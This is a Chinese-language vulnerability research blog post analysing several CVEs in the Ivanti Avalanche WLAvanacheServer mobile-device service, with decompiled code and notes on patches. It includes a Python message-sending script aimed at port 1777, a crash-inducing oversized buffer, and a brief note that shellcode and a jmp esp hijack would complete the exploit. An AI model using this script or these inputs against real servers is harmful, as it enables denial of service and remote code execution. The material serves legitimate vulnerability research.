---
slug: tiangongarticle049
date: 2024-10-16
title: Ivanti Avalanche WLAvanacheServer组件漏洞分析
author: z1r0
tags: ["Ivanti"]
---

## 一、前言

Avalanche Web 应用程序无法独立执行任务，但是它可以自由地使用不同的服务来执行任务。信息路由（也称为 InfoRail 服务）位于两者之间，负责在服务之间分发消息。Web创建一条消息并将其发送到 InfoRail 服务，后者将其转发到适当的目标服务。目标服务处理该消息并再次通过 InfoRail 服务将响应返回给 WebWLAvanacheServer是其中的移动设备服务，默认开启在1777端口上。WLAvanacheServer这个组件首次漏洞公开时间是2023年，成为了Avalanche的新攻击面，本文主要对WLAvanacheServer这个组件进行漏洞分析。

## 二、消息结构

这里是在6.4.0这个版本上分析消息结构，整个消息结构由三个主要部分组成：

* preamble
* header
* payload

下面是一个详细的消息内存结构：

```clike
0:039> dc 0242e8c0
0242e8c0  60000000 21000000 21000000 00000000  ...`...!...!....
0242e8d0  03000000 05000000 10000000 656e7770  ............pwne
0242e8e0  34313464 34313431 34313431 34313431  d414141414141414
0242e8f0  00000031 00000003 00000005 6e777010  1............pwn
0242e900  32346465 32343234 32343234 32343234  ed42424242424242
0242e910  00003234 00000000 00000000 00000000  42..............
0242e920  f57527e1 08202df9 0056a528 007713b0  .'u..- .(.V...w.
```

### 2.1 preamble

它的长度为16字节，主要由以下部分组成：

* MsgSize：整个消息的长度
* HdrSize：消息头的长度
* PayloadSize：消息的payload长度
* unk：这里目前不知道是做什么的，应该是某个标志，不影响分析

### 2.2 header

消息头由操作类型、名字和数据组成：

* type：消息的数据类型操作
* name_size：消息头的名字长度
* value_size：消息头的数据长度
* name：消息头的名字
* value：消息头的数据

### 2.3 payload

消息的payload也是由操作类型、名字和数据组成：

* type：消息的数据类型操作
* name_size：消息头的名字长度
* value_size：消息头的数据长度
* name：消息头的名字
* value：消息头的数据

在消息结尾需要对齐字节，并且有12个字节的补充，完整结构体如下：

```clike
00000000 struct Mu // sizeof=0x14
00000000 {                                       // XREF: hp/r hp/r
00000000     int type;
00000004     int name_size;
00000008     int value_size;
0000000C     char *name;                        //char name[name_size]
00000010     char *value;                       //char value[value_size]
00000014 };

00000000 struct preamble // sizeof=0x10
00000000 {                                       // XREF: msg/r
00000000     int MsgSize;
00000004     int HdrSize;
00000008     int PayloadSize;
0000000C     int unk;
00000010 };

00000000 struct hp // sizeof=0x28;variable_size
00000000 {                                       // XREF: msg/r
00000000     Mu hdr;
00000014     Mu payload;
00000028     char pad[];
00000028 };

00000000 struct msg // sizeof=0x38;variable_size
00000000 {
00000000     preamble pre;
00000010     hp hdr_pay;
00000038 };
```

## 三、消息发送脚本

下面这个是发送消息的脚本，将用户的数据以字节形式传入WLAvanacheServer去处理

```python
import socket
import struct
import sys

# Create an item structure for the header and payload
class Item:
    def __init__(self, type_, name, value):
        self.type = type_
        self.name = name.encode()
        self.value = value
        self.name_size = 0x5
        self.value_size = 0x10

    def pack(self):
        return struct.pack('>III{}s{}s'.format(self.name_size, self.value_size),
                           self.type, self.name_size, self.value_size, self.name, self.value)

# Create a header structure
class HP:
    def __init__(self, hdr, payload):
        self.hdr = hdr
        self.payload = payload
        self.pad = b'\x00' * (16 - (len(self.hdr) + len(self.payload)) % 16)

    def pack(self):
        return b''.join([item.pack() for item in self.hdr]) + \
               b''.join([item.pack() for item in self.payload]) + self.pad

# Create a preamble structure
class Preamble:
    def __init__(self, hp):
        self.msg_size = len(hp.pack()) + 16
        self.hdr_size = sum([len(item.pack()) for item in hp.hdr])
        self.payload_size = sum([len(item.pack()) for item in hp.payload])
        self.unk = 0  # Unknown value

    def pack(self):
        return struct.pack('>IIII', self.msg_size, self.hdr_size, self.payload_size, self.unk)

# Create a message structure
class Msg:
    def __init__(self, hp):
        self.pre = Preamble(hp)
        self.hdrpay = hp

    def pack(self):
        return self.pre.pack() + self.hdrpay.pack()

buf = b'41' * 0x10
buf2 = b'42' * 0x10

# Create message payload
hdr = [Item(3, "pwned1", buf)]
payload = [Item(3, "pwned2", buf2)] # dummy payload, probabaly not necessary
hp_instance = HP(hdr, payload)
msg_instance = Msg(hp_instance)
print(msg_instance.pack())

# Default port
port = 1777

# check for target host argument
if len(sys.argv) > 1:
    host = sys.argv[1]
else:)
    sys.exit()

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.connect((host, port))
    s.sendall(msg_instance.pack())
    print("Message sent!")
    s.close()
```

## 四、历史漏洞分析

基本所有的历史漏洞都是缓冲区溢出，并且程序保护基本没开（从6.4.0到最新版本），导致溢出洞的利用非常简单

 ![](/attachments/2024-10-16-ivanti-avalanche-wlavanacheserver//5a4f9f2f-d323-4d1e-b3a6-7c2fc21d98aa.png)

### 4.1 6.4.0

WLAvanacheServer会循环处理消息，处理顺序是先处理header再处理payload，处理消息的时候会检查消息格式是否正确：

```clike
......
while ( 1 )
  {
    p_Item =check_message(a1);
    if ( !p_Item )
      break;
    v8 = handle_message(p_Item, &p_Out);
    if ( v8 )
    {
      a1->field_50 = v8;
      return v8;
    }
......
  }
```

* 在check_message函数中可以看出header和payload的size都需要>=0
* 允许的数据操作类型不超过0x66
* NameSize有长度限制
* ValueSize只需要>=0

这里有个很明显的缺陷，ValueSize并没有去限制最长的长度，导致后续产生了一些相关漏洞

```clike
item *__cdecl sub_42A5C0(req *a1)
{
......
  v3 = ntohl(v4->name_size);                    // hp.name_size
  a1->hdr_size2 -= v3 + ntohl(v4->value_size) + 12;// name_size + value_size + 12
  if ( a1->hdr_size2 >= 0 )
  {
    a1->hp_ptr = v4;                            // hp
    a1->hp.type = ntohl(v4->type);              // hp.type
    a1->hp.Name = &v4->name;                    // hp.name
    a1->hp.NameSize = ntohl(v4->name_size);     // hp.name_size
    a1->hp.Value = &a1->hp.Name[a1->hp.NameSize];// hp.value
    a1->hp.ValueSize = ntohl(v4->value_size);   // hp.value_size
    if ( a1->hp.type <= 0x66u )
    {
      if ( a1->hp.NameSize > 0 && a1->hp.NameSize <= 0x100 )
      {
        if ( a1->hp.ValueSize >= 0 )
        {
          return &a1->hp;
        }
......
}
```

#### CVE-2023-32560（堆栈溢出）

在handle_message中，当type类型为3的时候会利用hexstr2bin函数将输入的十六进制字符串转换为二进制数据(type类型为5的时候也是同样的情况）

hexstr2bin函数最后的转换结果会存放到一个固定大小的缓冲区里(&p_Out→Value_ptr)

```clike
int __cdecl sub_42A8A0(item *p_Item, Data *p_Out)
{
.......
  switch ( p_Out->type )
  {.........
    case 2:
      Token_size = 127;
      if ( p_Item->ValueSize <= 127 )
        v4 = p_Item->ValueSize;
      else
        v4 = Token_size;
      Token_size = v4;
      qmemcpy(String, p_Item->Value, v4);
      String[Token_size] = 0;
      p_Out->Value_ptr = atol(String);
      return v11;
    case 3:
      p_Out->BytesConverted = hexstr2bin(p_Item->Value, &p_Out->Value_ptr, p_Item->ValueSize);
      return v11;
    ......
    case 5:
      hexstr2bin(p_Item->Value, &p_Out->Value_ptr, p_Item->ValueSize);
      return v11;
.......
}
```

hexstr2bin函数的具体实现如下，在转换成二进制数据的时候，ValueSize值由用户控制，在check\\_message的时候没有限制最长长度   

对Value\\_ptr不断赋值之后，形成一个缓冲区溢出漏洞 

```clike
int __cdecl hexstr2bin(char *Value, char *Value_ptr, int ValueSize)
{
......
  v7 = 0;
  if ( ValueSize % 2 == 1 )
  {
    if ( *Value < 0x61u || *Value > 0x7Au )
      v6 = *Value;
    else
      v6 = *Value - 32;
    if ( v6 < 0x30u || v6 > 0x39u )
      v8 = v6 - 55;
    else
      v8 = v6 - 48;
    *Value_ptr++ = v8;
    ++Value;
    --ValueSize;
    v7 = 1;
  }
  for ( i = 0; i < ValueSize; i += 2 )
  {
    if ( Value[i] < 0x61u || Value[i] > 0x7Au )
      v5 = Value[i];
    else
      v5 = Value[i] - 32;
    if ( Value[i + 1] < 0x61u || Value[i + 1] > 0x7Au )
      v4 = Value[i + 1];
    else
      v4 = Value[i + 1] - 32;
    if ( v5 < 0x30u || v5 > 0x39u )
      v9 = v5 - 55;
    else
      v9 = v5 - 48;
    v10 = 16 * v9;
    if ( v4 < 0x30u || v4 > 0x39u )
      v11 = v10 + v4 - 55;
    else
      v11 = v10 + v4 - 48;
    *Value_ptr++ = v11;
    ++v7;
  }
  return v7;
}
```

控制成如下的buf，可以使程序崩溃。对应的利用也非常简单，只需要将shellcode写入buf中，劫持jmp esp即可

```clike
buf = b'41' * 0x100000
buf2 = b'41' * 0x10000

(a0c.5298): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
WLAvalancheService+0x2b49e:
0042b49e 8810            mov     byte ptr [eax],dl          ds:002b:05110000=??
0:042:x86> kb
 # ChildEBP RetAddr      Args to Child          
WARNING: Stack unwind information not available. Following frames may be wrong.
00 0510fa38 0042aa7b     029188a1 05110000 00000800 WLAvalancheService+0x2b49e
01 0510fb1c 0042b54e     028e6594 0510fb68 00000000 WLAvalancheService+0x2aa7b
02 0510fe88 41414141     41414141 41414141 41414141 WLAvalancheService+0x2b54e
03 0510fe8c 41414141     41414141 41414141 41414141 0x41414141
04 0510fe90 41414141     41414141 41414141 41414141 0x41414141
05 0510fe94 41414141     41414141 41414141 41414141 0x41414141
06 0510fe98 41414141     41414141 41414141 41414141 0x41414141
```

这个CVE里还存在另外一个漏洞。

在type类型为9的处理中，程序流会走到sub\\_429600函数，这个函数是从数据中提取出以分号分隔的子字符串，并返回该子字符串的长度和下一个子字符串的起始位置。

```clike
int __cdecl sub_429600(_BYTE **a1, _DWORD *a2, unsigned int a3)
{
  int v4; // [esp+0h] [ebp-8h]
  _BYTE *i; // [esp+4h] [ebp-4h]

  v4 = 0;
  for ( i = *a1; i < a3 && *i == ' '; *a1 = i )
    ++i;
  if ( i >= a3 )
    return 0;
  while ( i < a3 && *i != ';' )
  {
    ++i;
    ++v4;
  }
  *a2 = i + 1;
  return v4;
}
```

接着会把函数返回的结果放入TokenSize，利用qmemcpy函数将当前子字符串复制到String缓冲区中，并使用atol函数将每个子字符串转换为长整型数。在qmemcpy时，由于TokenSize可控，发生缓冲区溢出漏洞

```clike
case 9:
      p_Out->ValueSize_ptr = 0;
      p_Out->Value_ptr = p_Out->Data_value;
      v8 = 0;
      Value = p_Item->Value;
      break;
......
while ( Value < &p_Item->Value[p_Item->ValueSize] )
  {
    Token_size = sub_429600(&Value, &v8, &p_Item->Value[p_Item->ValueSize]);
    qmemcpy(String, Value, Token_size);
    String[Token_size] = 0;
    *&p_Out->Data_value[4 * p_Out->ValueSize_ptr++] = atol(String);
    Value = v8;
    if ( p_Out->ValueSize_ptr > 49 )
      return 1;
  }
......
```

### 4.2 6.4.1

6\.4.0的fixcheck_message函数这里依旧没有对ValueSize进行修复，在6.4.1中出的漏洞还是与ValueSize相关

```clike
if ( a1->hp.ValueSize >= 0 )
        {
          return &a1->hp;
        }
```

数据类型操作3这里添加了对ValueSize的check，限制了长度小于255数据类型操作9这里只对Token_size这里进行了check，长度需要小于127

```clike
......
case 3:
      sub_4F9DB0(4, 0, aTvH);
      if ( a1->ValueSize > 255 )
        return 1;
      a2->BytesConverted = sub_42B3D0(a1->Value, &a2->Value_ptr, a1->ValueSize);
      return v11;
......
case 9:
      sub_4F9DB0(4, 0, aTvNl);
      a2->ValueSize_ptr = 0;
      a2->Value_ptr = a2->Data_value;
      v8 = 0;
      Value = a1->Value;
      break;
......
while ( Value < &a1->Value[a1->ValueSize] )
  {
    Token_Size = sub_429600(&Value, &v8, &a1->Value[a1->ValueSize]);
    if ( Token_Size > 127 )
      return 1;
    qmemcpy(String, Value, Token_Size);
    String[Token_Size] = 0;
    *&a2->Data_value[4 * a2->ValueSize_ptr++] = atol(String);
    Value = v8;
    if ( a2->ValueSize_ptr > 49 )
      return 1;
  }
```

#### CVE-2023-41727/CVE-2023-46216/CVE-2023-46217（堆栈溢出）

这三个漏洞发生在处理数据类型100/101/102的时候，和上面的CVE-2023-32560一样把函数返回的结果放入TokenSize，利用qmemcpy函数将当前子字符串复制到String缓冲区中在Token_size这里没有长度限制，发生缓冲区溢出漏洞

```clike
.....
case 100:
      sub_4F9DB0(4, 0, aTvFc);
      v8 = 0;
      v9 = 0;
      memset(&a2->Value_ptr, 0, 0x118u); 
      a2->Data_ValueSize = &a2->ValueSize_ptr;
      for ( Value = a1->Value; Value < &a1->Value[a1->ValueSize]; Value = v8 )
      {
        Token_Size = sub_429600(&Value, &v8, &a1->Value[a1->ValueSize]);
        switch ( ++v9 )
        {
          case 1:
            qmemcpy(String, Value, Token_Size);
            String[Token_Size] = 0;
            a2->Value_ptr = atol(String);
            break;
.....
```

#### CVE-2024-29204（堆栈溢出）

这个漏洞发生在处理RSP_FILE_UPLOAD消息，用户可以发送多个RSP_FILE_UPLOAD消息首先会将解压缩大小相加起来计算所有文件的块的解压缩大小，如果指定较大的解压缩大小，会导致TotalDecompressedSize发生整型溢出，TotalDecompressedSize的值会变小以TotalDecompressedSize创建堆块，在第23行这里会将完整的解压缩数据copy到创建的堆块中，但是这个堆块的大小是小于完整数据的，发生堆溢出漏洞。

```clike
......
for ( i = *(this + 7108); i; i = i[46] )
        TotalDecompressedSize += i[49];         // TotalDecompressedSize += INMSG.DecompressedSize
      TotalDecompressedSize_ptr = operator new(TotalDecompressedSize);
      if ( TotalDecompressedSize_ptr )
      {
        offset = 0;
        for ( i = *(this + 7108); i; i = i[46] )
        {
          if ( i[49] )
          {
            v24 = 0;
            LOBYTE(v23) = sub_4AFA70(this, i, *(this + 7092), &v24);
            if ( !v23 )
            {
              uploaded_file = sub_51B2D0(*(this + 7092) + 36);
              v2 = sub_4B1AF0(this);
              sub_4FABA0(1, 0, "%s: Decompression error while processing uploaded file: '%s'", v2, uploaded_file);
              sub_551E70(TotalDecompressedSize_ptr);
              *(this + 6948) = *(this + 7064);
              goto LABEL_50;
            }
            if ( v24 )
            {
              qmemcpy(&TotalDecompressedSize_ptr[offset], v24, i[49]);
              sub_551E70(v24);
            }
......
```

### 4.3 6.4.3

6\.4.2的fix这个版本添加了长度判断，在handle_message中的越界已经失效

```clike
......
if ( a1->hp.type <= 0x66u )
    {
      if ( a1->hp.NameSize > 0 && a1->hp.NameSize <= 256 )
      {
        if ( a1->hp.ValueSize >= 0 )
        {
          if ( &a1->hp.Value[a1->hp.ValueSize] <= a1->msg1 + a1->field_1C )
          {
            return &a1->hp;
          }
          else
          {
            a1->field_50 = -504;
            return 0;
          }
        }
......
```

对copy的数据长度进行了判断，每轮copy前判断到这次为止的压缩块大小是否大于总大于，大于则退出

```clike
......
alDecompressedSize = 0;
      for ( i = *(this + 7108); i; i = *(i + 184) )
        TotalDecompressedSize += *(i + 196);    // // TotalDecompressedSize += INMSG.DecompressedSize
      TotalDecompressedSize_ptr = operator new(TotalDecompressedSize);
      if ( TotalDecompressedSize_ptr )
      {
        offset = 0;
        for ( i = *(this + 7108); i; i = *(i + 184) )
        {
          if ( *(i + 196) )
          {
            if ( *(i + 196) + offset > TotalDecompressedSize )
            {
              v3 = sub_51B990(*(this + 7092) + 36);
              v4 = sub_4B1D60(this, v3);
              sub_4FB190(1, 0, aSDetectedBuffe, v4);
              sub_552530(TotalDecompressedSize_ptr);
              *(this + 6948) = *(this + 7064);
              goto LABEL_52;
            }
    .........         if ( v21 )
            {
              qmemcpy(&TotalDecompressedSize_ptr[offset], v21, *(i + 196));
              sub_552530(v21);
            }
      ......
```

这里没有仔细的去分析其他相关点，可能在新版上有相似的问题

### 4.4 6.4.4

在这篇文章初次写完之后新版本还停留在6.4.4，当时在6.4.4发现了多个0day。在第二次补充的时候突然发现在10.8号更新了6.4.5，而本次更新就修复了其中一个漏洞（撞洞）

#### CVE-2024-47007（空指针引用DOS）

在处理type类型为101时，将一个名为 Value 的指针指向 a1→Value 数组的起始位置，进入循环后检查Value 指针是否已经指向 a1→Value 数组的结尾。调用sub_429820函数去提取出以分号分隔的子字符串，获取大小后判断是否小于0xFF，如果小于则利用qmemcpy函数进行拷贝，接着继续循环截取下一段

```clike
case 101:
      sub_4FB190(4, 0, aTvFn);
      v8 = 0;
      v9 = 0;
      a2->Data_ValueSize = &a2->ValueSize_ptr;
      Value = a1->Value;
      while ( 2 )
      {
        if ( Value >= &a1->Value[a1->ValueSize] )
          return v11;
        Token_Size = sub_429820(&Value, &v8, &a1->Value[a1->ValueSize]);
        if ( ++v9 != 1 )
        {
          if ( v9 != 2 )
            goto LABEL_71;
          if ( Token_Size > 0xFF )
            return 1;
          qmemcpy(&a2->ValueSize_ptr, Value, Token_Size);
          *(&a2->ValueSize_ptr + Token_Size) = 0;
LABEL_71:
          Value = v8;
          continue;
        }
        break;
      }
      if ( Token_Size <= 0x7F )
      {
        qmemcpy(String, Value, Token_Size);
        String[Token_Size] = 0;
        a2->Value_ptr = atol(String);
        goto LABEL_71;
      }
      return 1;
```

漏洞点发生在sub_429820函数中，如果仅包含空格，第一次调用函数会反回0作为Token_Size，并且a1这里的值会变成NULL指针，下一次循环时Value还是小于&a1→Value\[a1→ValueSize\]，继续进入sub_429820函数中，在\*i == ' '这里发生空指针引用

```clike
int __cdecl sub_429820(char **a1, char *a2, unsigned int a3)
{
  int v4; // [esp+0h] [ebp-8h]
  char *i; // [esp+4h] [ebp-4h]

  v4 = 0;
  for ( i = *a1; i < a3 && *i == ' '; *a1 = i )
    ++i;
  if ( i >= a3 )
    return 0;
  while ( i < a3 && *i != ';' )
  {
    ++i;
    ++v4;
  }
  *a2 = i + 1;
  return v4;
}
```

\*i == ' '的汇编代码如下，eax为NULL

```clike
.text:00429840                 xor     ecx, ecx
.text:00429842                 mov     cl, [eax]
.text:00429844                 cmp     ecx, 20h ; ' '
```

case 102的代码与101基本相似，漏洞原理也是一样的，不详细展开了

```clike
case 102:
      sub_4FB190(4, 0, aTvFp);
      v8 = 0;
      v9 = 0;
      Value = a1->Value;
      while ( 2 )
      {
        if ( Value < &a1->Value[a1->ValueSize] )
        {
          Token_Size = sub_429820(&Value, &v8, &a1->Value[a1->ValueSize]);
          if ( Token_Size <= 0x7F )
          {
            qmemcpy(String, Value, Token_Size);
            String[Token_Size] = 0;
            if ( ++v9 == 1 )
            {
              a2->Value_ptr = atol(String);
            }
            else if ( v9 == 2 )
            {
              a2->ValueSize_ptr = atol(String);
            }
            Value = v8;
            continue;
          }
          return 1;
        }
        break;
      }
      return v11;
```

## 五、总结

本文首先介绍了WLAvanacheServer的消息结构，然后借助消息发送脚本进行调试分析，主要分析漏洞的形成原因。总体来说，这些漏洞比较简单，之前没有被发现的原因是lvanti Avalanche的大部分漏洞挖掘都集中在web端，而忽视了 WLAvanacheServer这一新的攻击面。将注意力转移到 WLAvanacheServer之后，就发现了其中存在大量漏洞。还有一个严重问题是针对 WLAvanacheServer 组件的漏洞修复工作非常不彻底，每个版本的修补都存在不足，导致仍留有可被攻击的漏洞。